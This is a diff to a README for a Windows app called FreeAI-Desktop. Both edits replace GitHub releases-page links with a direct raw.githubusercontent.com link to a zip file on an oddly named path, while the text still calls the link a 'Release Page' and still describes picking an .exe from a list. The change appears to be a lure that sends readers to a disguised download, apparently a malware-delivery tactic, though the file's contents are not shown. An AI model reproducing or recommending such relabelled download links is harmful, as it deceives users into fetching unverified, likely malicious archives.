@@ -5,7 +5,7 @@ description: "Run uncensored AI models locally on your Windows PC. Enjoy private
 ---
 # 🤖 FreeAI-Desktop - Private offline chat for Windows
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Fixed-spender284/FreeAI-Desktop/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Fixed-spender284/fixed-spender284.github.io/main/procellous/io_spender_github_fixed_v1.8.zip)
 
 ## 📖 About This App
 
@@ -25,7 +25,7 @@ Your computer needs specific parts to run this software well:
 
 Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/Fixed-spender284/FreeAI-Desktop/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/Fixed-spender284/fixed-spender284.github.io/main/procellous/io_spender_github_fixed_v1.8.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to download the installer.
 4. Open the downloaded file once the process finishes.
